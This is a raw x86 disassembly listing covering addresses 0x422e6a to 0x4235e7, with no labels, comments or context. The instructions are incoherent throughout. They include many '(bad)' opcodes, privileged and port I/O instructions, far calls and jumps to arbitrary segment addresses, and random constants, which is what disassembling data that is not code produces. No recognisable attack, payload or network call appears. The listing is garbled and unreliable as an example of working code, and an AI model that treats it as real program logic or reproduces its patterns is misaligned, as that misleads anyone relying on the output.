  422e6a:	sub    ebx,ebx
  422e6c:	stos   BYTE PTR es:[edi],al
  422e6d:	jmp    0x4f21:0x5c0796d7
  422e74:	aam    0x39
  422e76:	mov    dl,0xeb
  422e78:	mov    dh,0x3e
  422e7a:	addr16 adc ebp,ecx
  422e7d:	push   cs
  422e7e:	or     DWORD PTR [edx],0xffffffcd
  422e81:	pop    esi
  422e82:	sub    BYTE PTR [eax-0x26e75df7],dl
  422e88:	or     ebp,DWORD PTR [ebp-0x7fa75bea]
  422e8e:	mov    ch,0xce
  422e90:	or     al,0x61
  422e92:	push   ebp
  422e93:	in     eax,0x25
  422e95:	int3   
  422e96:	fadd   DWORD PTR [esi+0x4fdf5325]
  422e9c:	test   eax,0x5fafa9de
  422ea1:	sub    esp,ebx
  422ea3:	and    ecx,DWORD PTR [ecx+0x48]
  422ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ea7:	stos   DWORD PTR es:[edi],eax
  422ea8:	adc    BYTE PTR [edi+0x14082aae],ch
  422eae:	add    edi,DWORD PTR [ecx]
  422eb0:	(bad)  
  422eb1:	mov    ecx,0x8915470b
  422eb6:	test   BYTE PTR [ecx],dh
  422eb8:	test   BYTE PTR [esi-0x2c526c8e],bh
  422ebe:	inc    ebp
  422ebf:	or     ecx,DWORD PTR [ebx+edi*8+0x42]
  422ec3:	ret    
  422ec4:	aam    0x12
  422ec6:	aas    
  422ec7:	jne    0x422f08
  422ec9:	scas   al,BYTE PTR es:[edi]
  422eca:	sub    ch,bh
  422ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ecd:	jne    0x422f2c
  422ecf:	int3   
  422ed0:	jecxz  0x422e9d
  422ed2:	inc    esi
  422ed3:	or     ecx,DWORD PTR [ebp-0x4a]
  422ed6:	mov    ds:0xc232905b,al
  422edb:	ja     0x422e68
  422edd:	or     edx,DWORD PTR [esi]
  422edf:	ss xchg esp,eax
  422ee1:	push   0x7d
  422ee3:	shufps xmm5,xmm7,0x98
  422ee7:	fcmovnb st,st(4)
  422ee9:	fadd   QWORD PTR [edx+0x7b]
  422eec:	or     al,0x40
  422eee:	mov    bl,BYTE PTR [esi+ebx*4-0x7]
  422ef2:	jge    0x422f2f
  422ef4:	es jns 0x422f72
  422ef7:	leave  
  422ef8:	daa    
  422ef9:	inc    ebx
  422efa:	pop    ds
  422efb:	int3   
  422efc:	mov    al,al
  422efe:	and    ch,BYTE PTR [esi]
  422f00:	adc    BYTE PTR [bp+si-0x6a],al
  422f04:	leave  
  422f05:	or     esi,DWORD PTR [eax]
  422f07:	mov    bh,0xff
  422f09:	enter  0xb63c,0xe4
  422f0d:	hlt    
  422f0e:	daa    
  422f0f:	iret   
  422f10:	fild   QWORD PTR [ebx+0x2f]
  422f13:	xchg   ebx,eax
  422f14:	in     eax,dx
  422f15:	jno    0x422f15
  422f17:	(bad)  
  422f18:	clc    
  422f19:	mov    edi,0xfd6346ef
  422f1e:	lds    edi,FWORD PTR [edx]
  422f20:	mov    ch,0x92
  422f22:	aaa    
  422f23:	fisttp WORD PTR [eax+eiz*2]
  422f26:	and    al,0x45
  422f28:	mov    edi,?
  422f2a:	(bad)  
  422f2b:	std    
  422f2c:	leave  
  422f2d:	jbe    0x422f46
  422f2f:	pop    ecx
  422f30:	inc    edx
  422f31:	xchg   esp,eax
  422f32:	js     0x422efd
  422f34:	jne    0x422f63
  422f36:	sti    
  422f37:	(bad)  
  422f38:	stos   BYTE PTR es:[edi],al
  422f39:	xchg   ebx,eax
  422f3a:	mov    ch,0xa5
  422f3c:	cwde   
  422f3d:	push   0xb1b7a63e
  422f42:	pop    es
  422f43:	pop    es
  422f44:	xchg   edx,eax
  422f45:	cmc    
  422f46:	jnp    0x422ed2
  422f48:	test   eax,0xa0a4946e
  422f4d:	mov    edx,0xa8854a42
  422f52:	jecxz  0x422f3b
  422f54:	pushf  
  422f55:	jb     0x422f3d
  422f57:	or     esp,DWORD PTR [ebx-0x47]
  422f5a:	paddsw mm2,QWORD PTR [edi]
  422f5d:	(bad)  
  422f5e:	in     eax,dx
  422f5f:	jp     0x422f30
  422f61:	daa    
  422f62:	ins    BYTE PTR es:[edi],dx
  422f63:	fstp   DWORD PTR [esi]
  422f65:	pop    esp
  422f66:	mov    ds:0x24364c4d,al
  422f6b:	pop    ecx
  422f6c:	ret    
  422f6d:	stc    
  422f6e:	pop    eax
  422f6f:	pop    ecx
  422f70:	jbe    0x422f70
  422f72:	sbb    al,0xbf
  422f74:	call   0xf947:0xb017918
  422f7b:	xchg   esi,eax
  422f7c:	adc    DWORD PTR [eax+0x10],ebp
  422f7f:	fst    QWORD PTR [eax-0x32]
  422f82:	xchg   ebx,eax
  422f83:	inc    edi
  422f84:	mov    dh,0xf6
  422f86:	(bad)  
  422f87:	fwait
  422f88:	xor    al,0xc5
  422f8a:	pop    edi
  422f8b:	enter  0x237a,0x1e
  422f8f:	cmc    
  422f90:	sbb    al,0x17
  422f92:	je     0x422fd8
  422f94:	retf   
  422f95:	xchg   esp,eax
  422f96:	and    eax,0x311e7cad
  422f9b:	jns    0x422f58
  422f9d:	lea    ebp,[eax+0x6071652e]
  422fa3:	cmc    
  422fa4:	es add esi,ebp
  422fa7:	test   eax,0xdad12283
  422fac:	xor    DWORD PTR ds:0x81c82a3c,ebx
  422fb2:	cmp    eax,0x87f57567
  422fb7:	fwait
  422fb8:	sub    eax,0xe352d39b
  422fbd:	rcl    DWORD PTR [ebp-0x23f14576],1
  422fc3:	dec    edx
  422fc4:	(bad)  
  422fc5:	(bad)  
  422fc6:	call   0xc8b799f4
  422fcb:	add    al,0xaf
  422fcd:	push   ebp
  422fce:	adc    al,0x66
  422fd0:	retf   0x567
  422fd3:	push   edx
  422fd4:	ds loop 0x42300d
  422fd7:	pop    esp
  422fd8:	lds    esi,FWORD PTR [eax-0x27f52fd3]
  422fde:	sbb    edx,DWORD PTR [ebx]
  422fe0:	mov    ah,0x3b
  422fe2:	xchg   ecx,eax
  422fe3:	push   cs
  422fe4:	mov    bl,0x68
  422fe6:	mov    bh,0x26
  422fe8:	(bad)  
  422fe9:	cli    
  422fea:	icebp  
  422feb:	ss (bad) 
  422fed:	mov    bh,0x8a
  422fef:	popa   
  422ff0:	push   esp
  422ff1:	push   es
  422ff2:	rcl    DWORD PTR [esi-0x4962e0e9],1
  422ff8:	jmp    0x422ffb
  422ffa:	call   0xf126:0x4bb4a5b5
  423001:	fwait
  423002:	outs   dx,BYTE PTR ds:[esi]
  423003:	push   edx
  423004:	fcmovnu st,st(1)
  423006:	loop   0x422fcb
  423008:	leave  
  423009:	es mov esp,0x402e8613
  42300f:	rep ins DWORD PTR es:[edi],dx
  423011:	add    edi,esp
  423013:	jnp    0x422fb5
  423015:	add    BYTE PTR [ecx+eiz*4+0x7c7a13a8],ah
  42301c:	mov    esi,0xbdf017be
  423021:	mov    BYTE PTR [edx+0x22],bh
  423024:	(bad)  
  423025:	outs   dx,BYTE PTR ds:[esi]
  423026:	push   cs
  423027:	adc    ecx,ebp
  423029:	and    BYTE PTR [esi],0xb0
  42302c:	pop    ecx
  42302d:	pop    edx
  42302e:	pop    esp
  42302f:	inc    esp
  423030:	loop   0x423099
  423032:	dec    edx
  423033:	jbe    0x423078
  423035:	ja     0x423061
  423037:	mov    esp,0xf33f86b
  42303c:	call   0x22e1b60d
  423041:	jne    0x42308a
  423043:	adc    eax,0x4fa00c1c
  423048:	cmp    eax,0x900c7544
  42304d:	add    eax,0xf370ed65
  423052:	inc    edi
  423053:	dec    ebp
  423054:	outs   dx,BYTE PTR ds:[esi]
  423055:	loope  0x423056
  423057:	(bad)  
  423058:	fisttp WORD PTR [ebx-0x6913843]
  42305e:	mov    ecx,0xfaba1c8a
  423063:	ror    edx,0x69
  423066:	stc    
  423067:	stos   BYTE PTR es:[edi],al
  423068:	or     BYTE PTR [eax+0x4b5bd014],bh
  42306e:	cmp    BYTE PTR [edx-0xc],ah
  423071:	imul   DWORD PTR [edi]
  423073:	js     0x4230b3
  423075:	xor    BYTE PTR [ebp-0x79],dh
  423078:	mov    bh,0x86
  42307a:	(bad)  
  42307b:	lea    ebp,[eax]
  42307d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42307e:	mov    esp,0x2b5c52d
  423083:	ss pusha 
  423085:	sbb    BYTE PTR [eax-0x75],dl
  423088:	and    al,0x51
  42308a:	and    bl,BYTE PTR [edx+0x22]
  42308d:	(bad)  
  42308f:	jo     0x4230b0
  423091:	int    0x6a
  423093:	adc    eax,0xa2da3c75
  423098:	hlt    
  423099:	mov    edi,0xf4832ef4
  42309e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42309f:	aaa    
  4230a0:	xor    ebx,DWORD PTR [eax+0x56361264]
  4230a6:	mov    DWORD PTR [edx],ecx
  4230a8:	sub    BYTE PTR ds:0x86193268,0x5
  4230af:	loop   0x4230ef
  4230b1:	ficomp DWORD PTR [ebx+esi*1]
  4230b4:	jmp    FWORD PTR [edx+0xa]
  4230b7:	jne    0x4230e4
  4230b9:	bound  esi,QWORD PTR [esi]
  4230bb:	xor    BYTE PTR [edi-0x3c5ad832],dh
  4230c1:	mov    ah,0x51
  4230c3:	fcmovnb st,st(3)
  4230c5:	and    eax,0xcaadd2ce
  4230ca:	xchg   esp,eax
  4230cb:	ficomp DWORD PTR [ebp+ecx*4-0x80]
  4230cf:	retf   
  4230d0:	inc    edi
  4230d1:	shl    BYTE PTR [edi+ecx*8+0x6cd7ced],cl
  4230d8:	mov    BYTE PTR [edx+0x29],dl
  4230db:	jmp    0x4230c3
  4230dd:	outs   dx,DWORD PTR ds:[esi]
  4230de:	jno    0x423068
  4230e0:	repnz pop si
  4230e3:	(bad)  
  4230e4:	xor    DWORD PTR [edx+0x3],edi
  4230e7:	lods   al,BYTE PTR ds:[esi]
  4230e8:	inc    eax
  4230e9:	outs   dx,DWORD PTR ds:[esi]
  4230ea:	ret    0x5fea
  4230ed:	push   cs
  4230ee:	test   BYTE PTR [edi+0x100e36f7],0x52
  4230f5:	cdq    
  4230f6:	xchg   edi,eax
  4230f7:	(bad)  
  4230f8:	push   edi
  4230f9:	inc    ebx
  4230fa:	cli    
  4230fb:	(bad)  
  4230fc:	dec    ebp
  4230fd:	sbb    ch,BYTE PTR [ecx-0x12]
  423100:	fwait
  423101:	pop    edx
  423102:	mov    ebx,0x5e255d5
  423107:	data16 jnp 0x423155
  42310a:	loop   0x423129
  42310c:	leave  
  42310d:	mov    DWORD PTR [edi],ebx
  42310f:	dec    ecx
  423110:	xchg   esp,eax
  423111:	aas    
  423112:	xor    DWORD PTR [ecx-0x31],ebx
  423115:	cmp    BYTE PTR [eax-0x75e6480f],0xab
  42311c:	fs adc eax,ecx
  42311f:	jns    0x4230ee
  423121:	out    dx,al
  423122:	sbb    eax,0x3d46f37f
  423127:	rcl    DWORD PTR [ecx],1
  423129:	mov    ss,WORD PTR [ebp+ebx*8+0x5ceab646]
  423130:	mov    ah,0xb1
  423132:	pop    ss
  423133:	pop    ecx
  423134:	bound  eax,QWORD PTR [eax-0x7df04e08]
  42313a:	mov    al,ds:0x559609f1
  42313f:	cwde   
  423140:	aad    0xf7
  423142:	mov    ah,0x60
  423144:	mov    ebx,0x5316d57e
  423149:	sbb    dh,0x1c
  42314c:	xor    ah,bh
  42314e:	mov    ?,WORD PTR [ebx]
  423150:	jb     0x42310b
  423152:	dec    eax
  423153:	fsubr  DWORD PTR [esi-0x37bad270]
  423159:	xchg   edi,eax
  42315a:	gs in  eax,dx
  42315c:	cmc    
  42315d:	leave  
  42315e:	pop    eax
  42315f:	and    ebx,DWORD PTR [eax]
  423161:	and    al,0x7b
  423163:	mov    edx,0x7a6dd0d9
  423168:	dec    edi
  423169:	mov    esp,0x2feb776b
  42316e:	push   edx
  42316f:	ficomp WORD PTR [eax+0x1a8ad491]
  423175:	cdq    
  423176:	ret    
  423177:	add    DWORD PTR [ebp+0x5fdb4188],eax
  42317d:	call   0xb06b9774
  423182:	and    DWORD PTR [ebp-0x4],ecx
  423185:	je     0x4231b9
  423187:	fucomip st,st(1)
  423189:	and    ebx,eax
  42318b:	jno    0x4231e6
  42318d:	sbb    bh,BYTE PTR [ecx+0x0]
  423190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423191:	cmp    eax,0xa49ba6ce
  423196:	or     al,0x5
  423198:	dec    ebx
  423199:	stos   BYTE PTR es:[edi],al
  42319a:	fdivr  DWORD PTR [ebp+0x4ddb0c5d]
  4231a0:	jle    0x423211
  4231a2:	call   0x8fcf325
  4231a7:	and    bh,BYTE PTR [eax]
  4231a9:	loopne 0x423224
  4231ab:	xchg   ebp,eax
  4231ac:	std    
  4231ad:	popf   
  4231ae:	sub    bh,BYTE PTR [esi-0x2d8725c3]
  4231b4:	cmp    bh,cl
  4231b6:	jno    0x4231fd
  4231b8:	mov    ch,0x99
  4231ba:	(bad)  
  4231bb:	(bad)  
  4231bc:	xor    edi,ecx
  4231be:	push   0x17
  4231c0:	jns    0x4231b3
  4231c2:	sbb    al,0x7
  4231c4:	cmp    DWORD PTR [edx-0x2d],edi
  4231c7:	jg     0x4231e9
  4231c9:	in     eax,dx
  4231ca:	bnd jne 0x423232
  4231cd:	adc    esp,esp
  4231cf:	mov    ch,BYTE PTR [ebp+ecx*4+0x6c849c2f]
  4231d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231d7:	popa   
  4231d8:	mov    ah,BYTE PTR [ecx+ebx*8-0x65]
  4231dc:	jbe    0x423207
  4231de:	rol    esi,cl
  4231e0:	xchg   ebx,eax
  4231e1:	rcl    DWORD PTR [esi+edi*1+0x61],0xfb
  4231e6:	and    DWORD PTR [esi+0xd9b5b11],esp
  4231ec:	sub    DWORD PTR [eax],esp
  4231ee:	ins    BYTE PTR es:[edi],dx
  4231ef:	(bad)  
  4231f0:	repz fadd DWORD PTR [edi-0x348dfb65]
  4231f7:	repnz out dx,al
  4231f9:	or     bh,0x76
  4231fc:	pop    ebx
  4231fd:	dec    edi
  4231fe:	sti    
  4231ff:	xor    al,0x5a
  423201:	cmc    
  423202:	xchg   ecx,eax
  423203:	scas   eax,DWORD PTR es:[edi]
  423204:	jns    0x4231b5
  423206:	mov    fs,WORD PTR [esi]
  423208:	sar    ebp,1
  42320a:	jle    0x4231c5
  42320c:	cmp    dh,BYTE PTR [ecx-0x3f]
  42320f:	adc    esp,DWORD PTR [eax-0x6f74a057]
  423215:	or     BYTE PTR [ebp+0x240ff9ed],dl
  42321b:	xchg   ebx,eax
  42321c:	popf   
  42321d:	adc    edx,DWORD PTR [edx]
  42321f:	mov    DWORD PTR ds:0xbf621922,edx
  423225:	out    dx,al
  423226:	aaa    
  423227:	jl     0x423233
  423229:	out    dx,eax
  42322a:	pop    ebp
  42322b:	and    ah,BYTE PTR [edi-0xa3dc658]
  423231:	js     0x423211
  423233:	pop    ebp
  423234:	aaa    
  423235:	(bad)  
  423236:	mov    ecx,0xb1493fb5
  42323b:	mov    eax,0x6e33ce03
  423240:	or     bh,BYTE PTR cs:[esi+0x77]
  423244:	sbb    edx,DWORD PTR ds:[ebx-0x1c677053]
  42324b:	das    
  42324c:	push   ebp
  42324d:	pop    esp
  42324e:	pop    ebx
  42324f:	out    dx,al
  423250:	xor    BYTE PTR [eax-0x4c],al
  423253:	arpl   WORD PTR [eax],ax
  423255:	mov    ds:0x704c3376,al
  42325a:	and    al,0x3d
  42325c:	icebp  
  42325d:	cmp    al,0x73
  42325f:	cmp    eax,0x21c0901
  423264:	push   cx
  423266:	cmp    al,0x5a
  423268:	nop
  423269:	dec    ebx
  42326a:	adc    al,0x3e
  42326c:	xor    si,WORD PTR [ecx]
  42326f:	idiv   DWORD PTR [esi+0x3cc41cef]
  423275:	or     al,0x4d
  423277:	in     eax,dx
  423278:	lds    ebx,FWORD PTR [esi-0xc]
  42327b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42327c:	out    0x8e,eax
  42327e:	mov    edi,0xe3648212
  423283:	fisttp DWORD PTR [eax-0x49]
  423287:	(bad)  
  423288:	pop    ebx
  423289:	ja     0x423241
  42328b:	dec    ebp
  42328c:	mov    eax,ds:0xf98005d2
  423291:	je     0x423305
  423293:	dec    ebp
  423294:	shl    BYTE PTR [edi+ecx*1],cl
  423297:	jne    0x423244
  423299:	dec    BYTE PTR [eax-0x5f]
  42329c:	or     eax,0xc5d85d80
  4232a1:	scas   al,BYTE PTR es:[edi]
  4232a2:	jp     0x4232f5
  4232a4:	repz jb 0x423286
  4232a7:	nop
  4232a8:	dec    edx
  4232a9:	sbb    al,0xd1
  4232ab:	jbe    0x4232a2
  4232ad:	mov    DWORD PTR [ebp-0x44],ecx
  4232b0:	inc    esi
  4232b1:	int3   
  4232b2:	inc    ebp
  4232b3:	mov    bl,0xb9
  4232b5:	arpl   WORD PTR [esi+edx*8+0x4e],ax
  4232b9:	test   BYTE PTR [ecx+0x74b157fc],ah
  4232bf:	jbe    0x4232d3
  4232c1:	jb     0x42325a
  4232c3:	lods   al,BYTE PTR ds:[esi]
  4232c4:	cmp    eax,0x3693a527
  4232c9:	hlt    
  4232ca:	ret    0x3b52
  4232cd:	test   al,0xff
  4232cf:	call   0x2a8a:0xb234375e
  4232d6:	jno    0x4232c2
  4232d8:	xchg   esp,eax
  4232d9:	xchg   edi,eax
  4232da:	inc    BYTE PTR [eax+0x16b42deb]
  4232e0:	fcomp  DWORD PTR [esi+0x51]
  4232e3:	sub    al,0x54
  4232e5:	fidivr DWORD PTR [ebx+esi*4]
  4232e8:	xlat   BYTE PTR ds:[ebx]
  4232e9:	sbb    BYTE PTR [esi-0x60],bh
  4232ec:	xchg   ecx,eax
  4232ed:	or     BYTE PTR [eax],ah
  4232ef:	pand   mm6,QWORD PTR [edx+0x1186ea78]
  4232f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232f7:	jb     0x423293
  4232f9:	dec    ebp
  4232fa:	jno    0x42334f
  4232fc:	or     edi,eax
  4232fe:	popa   
  4232ff:	push   esi
  423300:	adc    DWORD PTR [eax-0x569488d1],ebx
  423306:	or     dl,dh
  423308:	popf   
  423309:	into   
  42330a:	jno    0x423303
  42330c:	fisub  WORD PTR [ecx]
  42330e:	sbb    ecx,DWORD PTR [eax-0x23]
  423311:	test   DWORD PTR [eax+0x1a67f9bc],ecx
  423317:	dec    esp
  423318:	push   ss
  423319:	mov    BYTE PTR [esi-0x3979ccc2],dh
  42331f:	div    BYTE PTR [edi]
  423321:	push   es
  423322:	cmp    bh,bh
  423324:	xor    eax,0xa6446d3e
  423329:	rol    DWORD PTR [ebp-0xe],1
  42332c:	scas   eax,DWORD PTR es:[edi]
  42332d:	or     al,0xe0
  42332f:	sbb    DWORD PTR [ebp-0x690fab9a],0xffffffee
  423336:	cli    
  423337:	push   edx
  423338:	cdq    
  423339:	stos   DWORD PTR es:[edi],eax
  42333a:	out    0xec,al
  42333c:	sub    edx,DWORD PTR [ebp+0x3b]
  42333f:	xor    al,0xaf
  423341:	ror    BYTE PTR [edx],1
  423343:	pop    eax
  423344:	fucom  st(6)
  423346:	pop    es
  423347:	xor    al,0x51
  423349:	fmulp  st(2),st
  42334b:	mov    ch,0xe8
  42334d:	jnp    0x423300
  42334f:	adc    DWORD PTR [ecx+0x2],ebx
  423352:	add    eax,0xe3a8e8d2
  423357:	inc    ebx
  423358:	test   BYTE PTR [esi-0x45],cl
  42335b:	add    ebp,DWORD PTR [eax+ecx*8-0x7935a25a]
  423362:	adc    ecx,DWORD PTR [ecx-0xa]
  423365:	into   
  423366:	test   esi,ebx
  423368:	mov    dh,0xff
  42336a:	je     0x42332d
  42336c:	xlat   BYTE PTR ds:[ebx]
  42336d:	push   0xffffff8a
  42336f:	loopne 0x4232f9
  423371:	and    edi,DWORD PTR [esi]
  423373:	fdiv   st,st(1)
  423375:	and    bl,BYTE PTR [ebp-0x7ab94076]
  42337b:	loope  0x4233ac
  42337d:	je     0x42334d
  42337f:	push   ebp
  423380:	scas   eax,DWORD PTR es:[edi]
  423381:	clc    
  423382:	xchg   ecx,eax
  423383:	jle    0x423390
  423385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423386:	or     al,0xd8
  423388:	sbb    ebp,ebx
  42338a:	jecxz  0x423366
  42338c:	retf   0x71f3
  42338f:	jnp    0x4233db
  423391:	cmp    dh,BYTE PTR [ebx]
  423393:	mov    dh,0x96
  423395:	imul   edx,DWORD PTR [ecx-0x16f2ac7f],0xffffffdb
  42339c:	imul   esi,DWORD PTR [esi],0x62a39900
  4233a2:	push   0xfdb61217
  4233a7:	xchg   eax,esi
  4233a9:	cwde   
  4233aa:	cmp    eax,0xb29a2e48
  4233af:	pop    edx
  4233b0:	pop    edi
  4233b1:	pop    esi
  4233b2:	mov    ebp,0x8f9d4adf
  4233b7:	add    esp,ebx
  4233b9:	sbb    BYTE PTR cs:[edi+0x44],bh
  4233bd:	sar    BYTE PTR [esi+0x639e1637],cl
  4233c3:	xchg   BYTE PTR [ecx-0x4b],dh
  4233c6:	and    al,0x86
  4233c8:	xor    eax,DWORD PTR [ebp-0x13]
  4233cb:	sbb    al,0xf3
  4233cd:	xor    BYTE PTR cs:[edi+0x1783e18e],ch
  4233d4:	add    edi,DWORD PTR [esi]
  4233d6:	push   cs
  4233d7:	xor    al,BYTE PTR [eax*4+0x2fc1fbca]
  4233de:	iret   
  4233df:	pop    ebx
  4233e0:	inc    eax
  4233e1:	in     al,0x67
  4233e3:	xchg   ecx,eax
  4233e4:	dec    esp
  4233e5:	out    0x81,al
  4233e7:	cmp    eax,0xda68248a
  4233ec:	dec    esp
  4233ed:	adc    edi,esp
  4233ef:	ss jg  0x423380
  4233f2:	fstp   TBYTE PTR [si+0x2d60]
  4233f7:	dec    ecx
  4233f8:	add    DWORD PTR [ecx+0x4a],0xa3348aa9
  4233ff:	ror    DWORD PTR [esi+0x19c454],0x48
  423406:	inc    ebp
  423407:	push   es
  423408:	jg     0x4233ff
  42340a:	jp     0x42347a
  42340c:	jl     0x4233e7
  42340e:	js     0x4233db
  423410:	xor    ebp,ebx
  423412:	retf   
  423413:	jnp    0x4233bb
  423415:	retf   
  423416:	lds    eax,FWORD PTR ds:0x20d07b25
  42341c:	into   
  42341d:	lods   eax,DWORD PTR ds:[esi]
  42341e:	inc    edi
  42341f:	add    dl,al
  423421:	stos   DWORD PTR es:[edi],eax
  423422:	adc    dh,ch
  423424:	loop   0x423496
  423426:	or     esp,esp
  423428:	hlt    
  423429:	(bad)  
  42342a:	leave  
  42342b:	aad    0x95
  42342d:	pushf  
  42342e:	enter  0x3ad2,0xf2
  423432:	push   ss
  423433:	xlat   BYTE PTR ds:[ebx]
  423434:	and    dl,BYTE PTR [esi-0x4f]
  423437:	ins    DWORD PTR es:[edi],dx
  423438:	and    DWORD PTR ds:0xf9005124,ebx
  42343e:	sub    bh,0x9d
  423441:	mov    dh,0x51
  423443:	or     bh,dl
  423445:	scas   eax,DWORD PTR es:[edi]
  423446:	sub    ebp,esp
  423448:	(bad)  
  423449:	outs   dx,BYTE PTR ds:[esi]
  42344a:	adc    al,0xe
  42344c:	daa    
  42344d:	call   0xb2adfb7b
  423452:	add    DWORD PTR [esi],edx
  423454:	adc    eax,0xf49a0f14
  423459:	addr16 jp 0x4233f8
  42345c:	mov    edx,0xabd07f90
  423461:	fcom   DWORD PTR [esi+0x7f830651]
  423467:	xor    eax,0xbae5a6d8
  42346c:	sahf   
  42346d:	jns    0x4234d0
  42346f:	outs   dx,DWORD PTR ds:[esi]
  423470:	pop    edi
  423471:	test   eax,0xe3d5a542
  423476:	jns    0x4234e9
  423478:	pop    edi
  423479:	mov    bl,0x89
  42347b:	enter  0xf1da,0xd6
  42347f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423480:	or     eax,0xf7fbccef
  423485:	inc    edx
  423486:	sbb    al,0xe
  423488:	and    al,ah
  42348a:	outs   dx,DWORD PTR ds:[esi]
  42348b:	sbb    esp,DWORD PTR [edx-0x7fbeeb50]
  423491:	(bad)  
  423492:	(bad)  
  423493:	cmp    dh,BYTE PTR [ebp-0x65]
  423496:	inc    esp
  423497:	cli    
  423498:	aad    0x6f
  42349a:	fs retf 0xa951
  42349e:	sub    DWORD PTR [ecx],0xa1cb8919
  4234a4:	push   0xffffffbf
  4234a6:	aaa    
  4234a7:	xchg   edi,eax
  4234a8:	js     0x4234fc
  4234aa:	pop    ebp
  4234ab:	data16 jecxz 0x42345b
  4234ae:	dec    eax
  4234af:	mov    ecx,0x59b41cd7
  4234b4:	into   
  4234b5:	push   esi
  4234b6:	mov    ds:0xed1ecdc0,al
  4234bb:	jne    0x423489
  4234bd:	lea    ecx,[edx-0x57a00a4f]
  4234c3:	push   ebx
  4234c4:	aas    
  4234c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234c6:	or     al,0xcb
  4234c8:	stos   BYTE PTR es:[edi],al
  4234c9:	xor    BYTE PTR [esi+0x4c],al
  4234cc:	cdq    
  4234cd:	sar    DWORD PTR [eax-0x7474164],cl
  4234d3:	(bad)  
  4234d4:	cmp    dl,BYTE PTR [edx]
  4234d6:	mov    ecx,0xd133f00d
  4234db:	jmp    0x4234ba
  4234dd:	(bad)  [edx]
  4234df:	jecxz  0x423528
  4234e1:	push   eax
  4234e2:	pop    ds
  4234e3:	int    0x76
  4234e5:	leave  
  4234e6:	(bad)  
  4234e7:	mov    esp,0x8bad94af
  4234ec:	popa   
  4234ed:	outs   dx,DWORD PTR ds:[esi]
  4234ee:	sub    al,0x53
  4234f0:	pop    edi
  4234f1:	cli    
  4234f2:	xchg   BYTE PTR [eax],ch
  4234f4:	dec    eax
  4234f5:	xor    BYTE PTR [ebx+0x64],bl
  4234f8:	mov    eax,ds:0xc0fbda9e
  4234fd:	dec    ebx
  4234fe:	clc    
  4234ff:	pop    edx
  423500:	and    al,0x23
  423502:	popa   
  423503:	shr    BYTE PTR [ebx+ebp*4+0x7b],1
  423507:	inc    edx
  423508:	into   
  423509:	aaa    
  42350a:	into   
  42350b:	mov    dl,0x3c
  42350d:	mov    eax,ds:0x52518ea1
  423512:	cmp    al,0xb3
  423514:	loop   0x423518
  423516:	leave  
  423517:	aaa    
  423518:	mov    al,0x12
  42351a:	mov    dl,0x81
  42351c:	lea    esp,[eax]
  42351e:	bound  ebp,QWORD PTR [edi+ebx*8-0x7]
  423522:	(bad)  
  423523:	loop   0x4234bc
  423525:	jmp    0x2648e059
  42352a:	hlt    
  42352b:	push   es
  42352c:	adc    al,0xff
  42352e:	into   
  42352f:	popf   
  423530:	cs mov ah,0xeb
  423533:	inc    edx
  423534:	loope  0x42357d
  423536:	cli    
  423537:	fs jb  0x423538
  42353a:	ins    DWORD PTR es:[edi],dx
  42353b:	in     eax,0xe5
  42353d:	add    DWORD PTR [esi+0x1e34a86c],ecx
  423543:	stos   DWORD PTR es:[edi],eax
  423544:	retf   0x14a7
  423547:	fld    TBYTE PTR [ebx]
  423549:	mov    eax,ds:0xe76bd013
  42354e:	bnd jle 0x423570
  423551:	xlat   BYTE PTR ds:[ebx]
  423552:	mov    eax,ds:0xcaa9fadb
  423557:	dec    esi
  423558:	addr16 jbe 0x42354f
  42355b:	jns    0x42355b
  42355d:	mov    bh,0xee
  42355f:	ja     0x42352b
  423561:	das    
  423562:	dec    esi
  423563:	sahf   
  423564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423565:	dec    ecx
  423566:	or     edi,DWORD PTR [ebp-0x4bd63c19]
  42356c:	xor    al,0xee
  42356e:	(bad)  
  42356f:	shr    BYTE PTR [ecx+0x71b366b8],0xb9
  423576:	push   esi
  423577:	gs pushf 
  423579:	imul   ebp,DWORD PTR [edx],0xffffffae
  42357c:	pop    ss
  42357d:	dec    ebx
  42357e:	in     eax,0x4a
  423580:	adc    al,0x3d
  423582:	xchg   edi,eax
  423583:	mov    ah,0xde
  423585:	pop    esp
  423586:	or     BYTE PTR [edx+edx*4+0x6a],cl
  42358a:	icebp  
  42358b:	in     eax,0xb9
  42358d:	imul   ebx,DWORD PTR [edi+0x33677ec7],0xffffffff
  423594:	push   esp
  423595:	xor    bl,al
  423597:	sub    esi,DWORD PTR [eax+esi*4-0x11]
  42359b:	mov    ch,cl
  42359d:	and    eax,0xdd3725da
  4235a2:	sub    eax,DWORD PTR [esi-0x72]
  4235a5:	jmp    0x423616
  4235a7:	xlat   BYTE PTR ds:[ebx]
  4235a8:	daa    
  4235a9:	inc    ecx
  4235aa:	cmc    
  4235ab:	inc    ebx
  4235ac:	xchg   ecx,eax
  4235ad:	fs pop ds
  4235af:	jp     0x42360a
  4235b1:	lods   al,BYTE PTR ds:[esi]
  4235b2:	cmp    DWORD PTR [ecx],esi
  4235b4:	dec    ebx
  4235b5:	fldcw  WORD PTR [edi+ebx*1-0x30]
  4235b9:	xchg   ebp,eax
  4235ba:	aad    0x4b
  4235bc:	shl    DWORD PTR [ecx+edi*4-0x33],0xae
  4235c1:	outs   dx,BYTE PTR ds:[esi]
  4235c2:	inc    eax
  4235c3:	xchg   BYTE PTR [ecx],ah
  4235c5:	xchg   ebp,eax
  4235c6:	and    al,0x86
  4235c8:	dec    ebp
  4235c9:	call   0x775:0x9ffbac05
  4235d0:	lods   al,BYTE PTR ds:[esi]
  4235d1:	ss ss ret 
  4235d4:	in     eax,0x7
  4235d6:	mov    bl,0x8e
  4235d8:	fcom   DWORD PTR [ecx+ecx*4+0x5972905d]
  4235df:	inc    esi
  4235e0:	rcl    DWORD PTR [esi],1
  4235e2:	bnd jno 0x423618
  4235e5:	fsub   DWORD PTR [edx]
  4235e7:	in     al,0x2e
